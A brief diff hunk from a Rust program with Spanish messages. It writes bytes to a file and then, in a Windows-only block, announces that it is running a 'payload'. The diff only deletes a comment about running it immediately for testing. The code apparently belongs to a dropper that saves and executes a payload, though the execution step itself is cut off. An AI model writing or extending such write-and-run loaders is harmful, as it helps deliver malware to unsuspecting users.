@@ -33,7 +33,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     file.write_all(&bytes)?;
     println!("✅ Archivo guardado en: {}", path);
 
-    // 3. EJECUTAR INMEDIATAMENTE (para pruebas)
     #[cfg(target_os = "windows")]
     {
         println!("🚀 Ejecutando payload...");
